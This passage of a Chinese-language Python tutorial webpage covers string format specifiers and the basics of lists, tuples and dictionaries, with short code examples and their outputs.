号</th><th>描述</th></tr></thead><tbody><tr><td>%c</td><td>格式化字符及其ASCII码</td></tr><tr><td>%s</td><td>格式化字符串</td></tr><tr><td>%d</td><td>格式化整数</td></tr><tr><td>%u</td><td>格式化无符号整型</td></tr><tr><td>%o</td><td>格式化无符号八进制数</td></tr><tr><td>%x</td><td>格式化无符号十六进制数</td></tr><tr><td>%X</td><td>格式化无符号十六进制数（大写）</td></tr><tr><td>%f</td><td>格式化浮点数字，可指定小数点后的精度</td></tr><tr><td>%e</td><td>用科学计数法格式化浮点数</td></tr><tr><td>%E</td><td>作用同%e，用科学计数法格式化浮点数</td></tr><tr><td>%g</td><td>%f和%e的简写</td></tr><tr><td>%G</td><td>%f 和 %E 的简写</td></tr><tr><td>%p</td><td>用十六进制数格式化变量的地址</td></tr></tbody></table><p>格式化操作符辅助指令:</p><table><thead><tr><th>符号</th><th>功能</th></tr></thead><tbody><tr><td>*</td><td>定义宽度或者小数点精度</td></tr><tr><td>-</td><td>用做左对齐</td></tr><tr><td>+</td><td>在正数前面显示加号( + )</td></tr><tr><td><sp></td><td>在正数前面显示空格</td></tr><tr><td>#</td><td>在八进制数前面显示零(‘0’)，在十六进制前面显示’0x’或者’0X’(取决于用的是’x’还是’X’)</td></tr><tr><td>0</td><td>显示的数字前面填充’0’而不是默认的空格</td></tr><tr><td>%</td><td>‘%%’输出一个单一的’%’</td></tr><tr><td>(var)</td><td>映射变量(字典参数)</td></tr><tr><td>m.n.</td><td>m 是显示的最小总宽度,n 是小数点后的位数(如果可用的话)</td></tr></tbody></table><p>Python2.6 开始，新增了一种格式化字符串的函数 <a href="https://www.runoob.com/python/att-string-format.html">str.format()</a>，它增强了字符串格式化的功能。</p><h3 id="ps-1"><a href="#ps-1" class="headerlink" title="ps"></a>ps</h3><p>python 不支持复数转换为整数或浮点数</p><p>随机数函数中缺少 <strong>randint,sample</strong>random.randint(x,y)　#随机生一个整数int类型，可以指定这个整数的范围</p><h2 id="7-列表"><a href="#7-列表" class="headerlink" title="7.列表"></a>7.列表</h2><p>序列是 Python 中最基本的数据结构。</p><p>序列中的每个值都有对应的位置值，称之为索引，第一个索引是 0，第二个索引是 1，依此类推。</p><p> Python 有 6 个序列的内置类型，但最常见的是列表和元组。</p><p>列表都可以进行的操作包括索引，切片，加，乘，检查成员。</p><p>此外，Python 已经内置确定序列的长度以及确定最大和最小的元素的方法。</p><p>列表是最常用的 Python 数据类型，它可以作为一个方括号内的逗号分隔值出现。</p><p>列表的数据项不需要具有相同的类型</p><h3 id="访问列表中的值"><a href="#访问列表中的值" class="headerlink" title="访问列表中的值"></a>访问列表中的值</h3><p>与字符串的索引一样，列表索引从 0 开始，第二个索引是 1，依此类推。</p><p>通过索引列表可以进行截取、组合等操作。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#!/usr/bin/python3<br><br>list = <span class="hljs-selector-attr">[<span class="hljs-string">&#x27;red&#x27;</span>, <span class="hljs-string">&#x27;green&#x27;</span>, <span class="hljs-string">&#x27;blue&#x27;</span>, <span class="hljs-string">&#x27;yellow&#x27;</span>, <span class="hljs-string">&#x27;white&#x27;</span>, <span class="hljs-string">&#x27;black&#x27;</span>]</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">( list[<span class="hljs-number">0</span>] )</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">( list[<span class="hljs-number">1</span>] )</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">( list[<span class="hljs-number">2</span>] )</span></span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#!/usr/bin/python3<br><br>list = <span class="hljs-selector-attr">[<span class="hljs-string">&#x27;red&#x27;</span>, <span class="hljs-string">&#x27;green&#x27;</span>, <span class="hljs-string">&#x27;blue&#x27;</span>, <span class="hljs-string">&#x27;yellow&#x27;</span>, <span class="hljs-string">&#x27;white&#x27;</span>, <span class="hljs-string">&#x27;black&#x27;</span>]</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">( list[-<span class="hljs-number">1</span>] )</span></span>#倒数第一个元素<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">( list[-<span class="hljs-number">2</span>] )</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">( list[-<span class="hljs-number">3</span>] )</span></span><br></code></pre></td></tr></table></figure><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs d"><span class="hljs-meta">#!/usr/bin/python3</span><br><br>nums = [<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>, <span class="hljs-number">50</span>, <span class="hljs-number">60</span>, <span class="hljs-number">70</span>, <span class="hljs-number">80</span>, <span class="hljs-number">90</span>]<br>print(nums[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])#输出索引<span class="hljs-number">0</span>，<span class="hljs-number">1</span>，<span class="hljs-number">2</span>，<span class="hljs-number">3</span>的元素<br><br>输出结果：<br>[<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>]<br></code></pre></td></tr></table></figure><h3 id="更新列表"><a href="#更新列表" class="headerlink" title="更新列表"></a>更新列表</h3><p>你可以对列表的数据项进行修改或更新，你也可以使用 append() 方法来添加列表项，如下所示：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python3</span><br> <br>list = [<span class="hljs-string">&#x27;Google&#x27;</span>, <span class="hljs-string">&#x27;Runoob&#x27;</span>, 1997, 2000]<br> <br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;第三个元素为 : &quot;</span>, list[2])<br>list[2] = 2001<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;更新后的第三个元素为 : &quot;</span>, list[2])<br> <br>list1 = [<span class="hljs-string">&#x27;Google&#x27;</span>, <span class="hljs-string">&#x27;Runoob&#x27;</span>, <span class="hljs-string">&#x27;Taobao&#x27;</span>]<br>list1.append(<span class="hljs-string">&#x27;Baidu&#x27;</span>)<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;更新后的列表 : &quot;</span>, list1)<br><br>输出结果：<br>第三个元素为 :  1997<br>更新后的第三个元素为 :  2001<br>更新后的列表 :  [<span class="hljs-string">&#x27;Google&#x27;</span>, <span class="hljs-string">&#x27;Runoob&#x27;</span>, <span class="hljs-string">&#x27;Taobao&#x27;</span>, <span class="hljs-string">&#x27;Baidu&#x27;</span>]<br></code></pre></td></tr></table></figure><h3 id="删除列表元素"><a href="#删除列表元素" class="headerlink" title="删除列表元素"></a>删除列表元素</h3><p>可以使用 del 语句来删除列表的的元素，如下实例：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python3</span><br> <br>list = [<span class="hljs-string">&#x27;Google&#x27;</span>, <span class="hljs-string">&#x27;Runoob&#x27;</span>, 1997, 2000]<br> <br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;原始列表 : &quot;</span>, list)<br>del list[2]<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;删除第三个元素 : &quot;</span>, list)<br><br>输出结果：<br>原始列表 :  [<span class="hljs-string">&#x27;Google&#x27;</span>, <span class="hljs-string">&#x27;Runoob&#x27;</span>, 1997, 2000]<br>删除第三个元素 :  [<span class="hljs-string">&#x27;Google&#x27;</span>, <span class="hljs-string">&#x27;Runoob&#x27;</span>, 2000]<br></code></pre></td></tr></table></figure><h3 id="列表脚本操作符"><a href="#列表脚本操作符" class="headerlink" title="列表脚本操作符"></a>列表脚本操作符</h3><p>列表对 + 和  * 的操作符与字符串相似。+ 号用于组合列表，* 号用于重复列表。</p><p>如下所示：</p><table><thead><tr><th>Python 表达式</th><th>结果</th><th>描述</th></tr></thead><tbody><tr><td>len([1, 2, 3])</td><td>3</td><td>长度</td></tr><tr><td>[1, 2, 3] + [4, 5, 6]</td><td>[1, 2, 3, 4, 5, 6]</td><td>组合</td></tr><tr><td>[‘Hi!’] * 4</td><td>[‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’]</td><td>重复</td></tr><tr><td>3 in [1, 2, 3]</td><td>True</td><td>元素是否存在于列表中</td></tr><tr><td>for x in [1, 2, 3]: print(x, end&#x3D;” “)</td><td>1 2 3</td><td>迭代</td></tr></tbody></table><h3 id="嵌套列表"><a href="#嵌套列表" class="headerlink" title="嵌套列表"></a>嵌套列表</h3><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&gt;&gt;&gt;a = [<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>]<br>&gt;&gt;&gt; n = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<br>&gt;&gt;&gt; x = [a, n]<br>&gt;&gt;&gt; x<br>[[<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]]<br>&gt;&gt;&gt; x[<span class="hljs-number">0</span>]<br>[<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>]<br>&gt;&gt;&gt; x[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]<br><span class="hljs-string">&#x27;b&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="列表函数-方法"><a href="#列表函数-方法" class="headerlink" title="列表函数&amp;方法"></a>列表函数&amp;方法</h3><p>Python包含以下函数:</p><table><thead><tr><th>序号</th><th>函数</th></tr></thead><tbody><tr><td>1</td><td><a href="https://www.runoob.com/python3/python3-att-list-len.html">len(list)</a> 列表元素个数</td></tr><tr><td>2</td><td><a href="https://www.runoob.com/python3/python3-att-list-max.html">max(list)</a> 返回列表元素最大值</td></tr><tr><td>3</td><td><a href="https://www.runoob.com/python3/python3-att-list-min.html">min(list)</a> 返回列表元素最小值</td></tr><tr><td>4</td><td><a href="https://www.runoob.com/python3/python3-att-list-list.html">list(seq)</a> 将元组转换为列表</td></tr></tbody></table><p>Python包含以下方法:</p><table><thead><tr><th>序号</th><th>方法</th></tr></thead><tbody><tr><td>1</td><td><a href="https://www.runoob.com/python3/python3-att-list-append.html">list.append(obj)</a> 在列表末尾添加新的对象</td></tr><tr><td>2</td><td><a href="https://www.runoob.com/python3/python3-att-list-count.html">list.count(obj)</a> 统计某个元素在列表中出现的次数</td></tr><tr><td>3</td><td><a href="https://www.runoob.com/python3/python3-att-list-extend.html">list.extend(seq)</a> 在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）</td></tr><tr><td>4</td><td><a href="https://www.runoob.com/python3/python3-att-list-index.html">list.index(obj)</a> 从列表中找出某个值第一个匹配项的索引位置</td></tr><tr><td>5</td><td><a href="https://www.runoob.com/python3/python3-att-list-insert.html">list.insert(index, obj)</a> 将对象插入列表</td></tr><tr><td>6</td><td>[list.pop(<a href="https://www.runoob.com/python3/python3-att-list-pop.html">index&#x3D;-1])</a> 移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</td></tr><tr><td>7</td><td><a href="https://www.runoob.com/python3/python3-att-list-remove.html">list.remove(obj)</a> 移除列表中某个值的第一个匹配项</td></tr><tr><td>8</td><td><a href="https://www.runoob.com/python3/python3-att-list-reverse.html">list.reverse()</a> 反向列表中元素</td></tr><tr><td>9</td><td><a href="https://www.runoob.com/python3/python3-att-list-sort.html">list.sort( key&#x3D;None, reverse&#x3D;False)</a> 对原列表进行排序 id(list)看是否是在原列表的位置下，sorted可以维持原列表不变，产生一个新的列表。</td></tr><tr><td>10</td><td><a href="https://www.runoob.com/python3/python3-att-list-clear.html">list.clear()</a> 清空列表</td></tr><tr><td>11</td><td><a href="https://www.runoob.com/python3/python3-att-list-copy.html">list.copy()</a> 复制列表</td></tr></tbody></table><h3 id="列表遍历"><a href="#列表遍历" class="headerlink" title="列表遍历"></a>列表遍历</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 正序遍历：</span><br>list01 = [<span class="hljs-string">&quot;Googl&quot;</span>,<span class="hljs-string">&#x27;Runoob&#x27;</span>,<span class="hljs-number">1997</span>,<span class="hljs-number">2002</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(list01)):  <span class="hljs-comment">#用法1    </span><br>    <span class="hljs-built_in">print</span>(list01[i])<br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> list01:  <span class="hljs-comment">#用法2    </span><br>    <span class="hljs-built_in">print</span>(item)<br><span class="hljs-comment"># 反向遍历</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(list01) - <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):    <br>    <span class="hljs-built_in">print</span>(list01[i])<br></code></pre></td></tr></table></figure><h3 id="列表生成式"><a href="#列表生成式" class="headerlink" title="列表生成式"></a>列表生成式</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">lst</span>=[i for i in range(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>)]#列表lst中存储<span class="hljs-number">1</span>到<span class="hljs-number">10</span>的i的值<br></code></pre></td></tr></table></figure><h2 id="8-元组"><a href="#8-元组" class="headerlink" title="8.元组"></a>8.元组</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Python 的元组与列表类似，不同之处在于元组的元素不能修改。</p><p>元组使用小括号 ( )，列表使用方括号 [ ]。</p><p>元组创建很简单，只需要在括号中添加元素，并使用逗号隔开即可。</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">tup1 = (<span class="hljs-string">&#x27;Google&#x27;</span>, <span class="hljs-string">&#x27;Runoob&#x27;</span>, <span class="hljs-number">1997</span>, <span class="hljs-number">2000</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">tup2 = (<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span> )</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">tup3 = <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;d&quot;</span>   <span class="hljs-comment">#  不需要括号也可以</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">type</span>(tup3)</span><br>&lt;class &#x27;tuple&#x27;&gt;<br></code></pre></td></tr></table></figure><p>元组中只包含一个元素时，需要在元素后面添加逗号 , ，否则括号会被当作运算符使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>tup1 = (<span class="hljs-number">50</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">type</span>(tup1)     <span class="hljs-comment"># 不加逗号，类型为整型</span><br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;<br><br><span class="hljs-meta">&gt;&gt;&gt; </span>tup1 = (<span class="hljs-number">50</span>,)<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">type</span>(tup1)     <span class="hljs-comment"># 加上逗号，类型为元组</span><br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="访问元组"><a href="#访问元组" class="headerlink" title="访问元组"></a>访问元组</h3><p>元组可以使用下标索引来访问元组中的值，如下实例:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python3</span><br> <br>tup1 = (<span class="hljs-string">&#x27;Google&#x27;</span>, <span class="hljs-string">&#x27;Runoob&#x27;</span>, 1997, 2000)<br>tup2 = (1, 2, 3, 4, 5, 6, 7 )<br> <br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;tup1[0]: &quot;</span>, tup1[0])<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;tup2[1:5]: &quot;</span>, tup2[1:5])<br><br><br>输出结果：<br>tup1[0]:  Google<br>tup2[1:5]:  (2, 3, 4, 5)<br></code></pre></td></tr></table></figure><h3 id="修改元组"><a href="#修改元组" class="headerlink" title="修改元组"></a>修改元组</h3><p>元组中的元素值是不允许修改的，但我们可以对元组进行连接组合，如下实例:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python3</span><br> <br>tup1 = (12, 34.56)<br>tup2 = (<span class="hljs-string">&#x27;abc&#x27;</span>, <span class="hljs-string">&#x27;xyz&#x27;</span>)<br> <br><span class="hljs-comment"># 以下修改元组元素操作是非法的。</span><br><span class="hljs-comment"># tup1[0] = 100</span><br> <br><span class="hljs-comment"># 创建一个新的元组</span><br>tup3 = tup1 + tup2<br><span class="hljs-built_in">print</span> (tup3)<br><br>输出结果：<br>(12, 34.56, <span class="hljs-string">&#x27;abc&#x27;</span>, <span class="hljs-string">&#x27;xyz&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="删除元组"><a href="#删除元组" class="headerlink" title="删除元组"></a>删除元组</h3><p>元组中的元素值是不允许删除的，但我们可以使用del语句来删除整个元组</p><h3 id="元组运算符"><a href="#元组运算符" class="headerlink" title="元组运算符"></a>元组运算符</h3><p>与字符串一样，元组之间可以使用 + 号和 * 号进行运算。这就意味着他们可以组合和复制，运算后会生成一个新的元组。</p><table><thead><tr><th>Python 表达式</th><th>结果</th><th>描述</th></tr></thead><tbody><tr><td><code>len((1, 2, 3))</code></td><td>3</td><td>计算元素个数</td></tr><tr><td><code>(1, 2, 3) + (4, 5, 6)</code></td><td>(1, 2, 3, 4, 5, 6)</td><td>连接</td></tr><tr><td><code>(&#39;Hi!&#39;,) * 4</code></td><td>(‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’)</td><td>复制</td></tr><tr><td><code>3 in (1, 2, 3)</code></td><td>True</td><td>元素是否存在</td></tr><tr><td><code>for x in (1, 2, 3):     print (x, end=&quot; &quot;)</code></td><td>1 2 3</td><td>迭代</td></tr></tbody></table><h3 id="元组索引，截取"><a href="#元组索引，截取" class="headerlink" title="元组索引，截取"></a>元组索引，截取</h3><p>因为元组也是一个序列，所以我们可以访问元组中的指定位置的元素，也可以截取索引中的一段元素。</p><table><thead><tr><th>Python 表达式</th><th>结果</th><th>描述</th></tr></thead><tbody><tr><td>tup[1]</td><td>‘Runoob’</td><td>读取第二个元素</td></tr><tr><td>tup[-2]</td><td>‘Weibo’</td><td>反向读取，读取倒数第二个元素</td></tr><tr><td>tup[1:]</td><td>(‘Runoob’, ‘Taobao’, ‘Wiki’, ‘Weibo’, ‘Weixin’)</td><td>截取元素，从第二个开始后的所有元素。</td></tr><tr><td>tup[1:4]</td><td>(‘Runoob’, ‘Taobao’, ‘Wiki’)</td><td>截取元素，从第二个开始到第四个元素（索引为 3）。</td></tr></tbody></table><h3 id="元组内置函数"><a href="#元组内置函数" class="headerlink" title="元组内置函数"></a>元组内置函数</h3><p>Python元组包含了以下内置函数</p><table><thead><tr><th>序号</th><th>方法及描述</th><th>实例</th></tr></thead><tbody><tr><td>1</td><td>len(tuple) 计算元组元素个数。</td><td><code>&gt;&gt;&gt; tuple1 = (&#39;Google&#39;, &#39;Runoob&#39;, &#39;Taobao&#39;) &gt;&gt;&gt; len(tuple1) 3 &gt;&gt;&gt; </code></td></tr><tr><td>2</td><td>max(tuple) 返回元组中元素最大值。</td><td><code>&gt;&gt;&gt; tuple2 = (&#39;5&#39;, &#39;4&#39;, &#39;8&#39;) &gt;&gt;&gt; max(tuple2) &#39;8&#39; &gt;&gt;&gt; </code></td></tr><tr><td>3</td><td>min(tuple) 返回元组中元素最小值。</td><td><code>&gt;&gt;&gt; tuple2 = (&#39;5&#39;, &#39;4&#39;, &#39;8&#39;) &gt;&gt;&gt; min(tuple2) &#39;4&#39; &gt;&gt;&gt; </code></td></tr><tr><td>4</td><td>tuple(iterable) 将可迭代系列转换为元组。</td><td><code>&gt;&gt;&gt; list1= [&#39;Google&#39;, &#39;Taobao&#39;, &#39;Runoob&#39;, &#39;Baidu&#39;] &gt;&gt;&gt; tuple1=tuple(list1) &gt;&gt;&gt; tuple1 (&#39;Google&#39;, &#39;Taobao&#39;, &#39;Runoob&#39;, &#39;Baidu&#39;)</code></td></tr></tbody></table><h2 id="9-字典"><a href="#9-字典" class="headerlink" title="9.字典"></a>9.字典</h2><p>字典是另一种可变容器模型，且可存储任意类型对象。</p><p>字典的每个键值 key&#x3D;&gt;value  对用冒号 :  分割，每个对之间用逗号(<strong>,</strong>)分割，整个字典包括在花括号 {} 中 ,格式如下所示：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">d = &#123;key1 : <span class="hljs-type">value1</span>, key2 : <span class="hljs-type">value2</span>, key3 : <span class="hljs-type">value3</span> &#125;<br></code></pre></td></tr></table></figure><p>键必须是唯一的，但值则不必。</p><p>值可以取任何数据类型，但键必须是不可变的，如字符串，数字。</p><p>一个简单的字典实例：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">tinydict</span> = &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;runoob&#x27;</span>, <span class="hljs-string">&#x27;likes&#x27;</span>: <span class="hljs-number">123</span>, <span class="hljs-string">&#x27;url&#x27;</span>: <span class="hljs-string">&#x27;www.runoob.com&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="创建空字典"><a href="#创建空字典" class="headerlink" title="创建空字典"></a>创建空字典</h3><p>使用大括号 { } 创建空字典</p><p>使用内建函数 dict() 创建字典</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">emptyDict</span> <span class="hljs-operator">=</span> &#123;&#125;<br><span class="hljs-attribute">emptyDict</span> <span class="hljs-operator">=</span> dict()<br></code></pre></td></tr></table></figure><h3 id="访问字典里的值"><a href="#访问字典里的值" class="headerlink" title="访问字典里的值"></a>访问字典里的值</h3><p>把相应的键放入到方括号中，如下实例:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python3</span><br> <br>tinydict = &#123;<span class="hljs-string">&#x27;Name&#x27;</span>: <span class="hljs-string">&#x27;Runoob&#x27;</span>, <span class="hljs-string">&#x27;Age&#x27;</span>: 7, <span class="hljs-string">&#x27;Class&#x27;</span>: <span class="hljs-string">&#x27;First&#x27;</span>&#125;<br> <br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;tinydict[&#x27;Name&#x27;]: &quot;</span>, tinydict[<span class="hljs-string">&#x27;Name&#x27;</span>])<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;tinydict[&#x27;Age&#x27;]: &quot;</span>, tinydict[<span class="hljs-string">&#x27;Age&#x27;</span>])<br><br>tinydict[<span class="hljs-string">&#x27;Name&#x27;</span>]:  Runoob<br>tinydict[<span class="hljs-string">&#x27;Age&#x27;</span>]:  7<br></code></pre></td></tr></table></figure><h3 id="修改字典"><a href="#修改字典" class="headerlink" title="修改字典"></a>修改字典</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">tinydict <span class="hljs-punctuation">=</span> &#123;&#x27;Name&#x27;<span class="hljs-punctuation">:</span> &#x27;Runoob&#x27;<span class="hljs-punctuation">,</span> &#x27;Age&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">7</span><span class="hljs-punctuation">,</span> &#x27;Class&#x27;<span class="hljs-punctuation">:</span> &#x27;First&#x27;&#125;<br> <br>tinydict[&#x27;Age&#x27;] <span class="hljs-punctuation">=</span> <span class="hljs-number">8</span>               <span class="hljs-meta"># 更新 Age</span><br>tinydict[&#x27;School&#x27;] <span class="hljs-punctuation">=</span> <span class="hljs-string">&quot;abcd&quot;</span>  <span class="hljs-meta"># 添加信息，直接写入新的即可</span><br></code></pre></td></tr></table></figure><h3 id="删除字典元素"><a href="#删除字典元素" class="headerlink" title="删除字典元素"></a>删除字典元素</h3><p>能删单一的元素也能清空字典，清空只需一项操作。</p><p>显式删除一个字典用del命令，如下实例：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#!/usr/bin/python3</span><br> <br>tinydict = &#123;<span class="hljs-string">&#x27;Name&#x27;</span>: <span class="hljs-string">&#x27;Runoob&#x27;</span>, <span class="hljs-string">&#x27;Age&#x27;</span>: <span class="hljs-number">7</span>, <span class="hljs-string">&#x27;Class&#x27;</span>: <span class="hljs-string">&#x27;First&#x27;</span>&#125;<br> <br><span class="hljs-built_in">del</span> tinydict[<span class="hljs-string">&#x27;Name&#x27;</span>] <span class="hljs-comment"># 删除键 &#x27;Name&#x27;</span><br>tinydict.clear()     <span class="hljs-comment"># 清空字典</span><br><span class="hljs-built_in">del</span> tinydict         <span class="hljs-comment"># 删除字典</span><br></code></pre></td></tr></table></figure><h3 id="字典键的特性"><a href="#字典键的特性" class="headerlink" title="字典键的特性"></a>字典键的特性</h3><p>字典值可以是任何的 python 对象，既可以是标准的对象，也可以是用户定义的，但键不行。</p><p>两个重要的点需要记住</p><p>1）不允许同一个键出现两次。创建时如果同一个键被赋值两次，后一个值会被记住.</p><p>2）键必须不可变，所以可以用数字，字符串或元组充当，而用列表就不行,因为列表数值可以改变，而元组不可以改变。</p><h3 id="字典内置函数-方法"><a href="#字典内置函数-方法" class="headerlink" 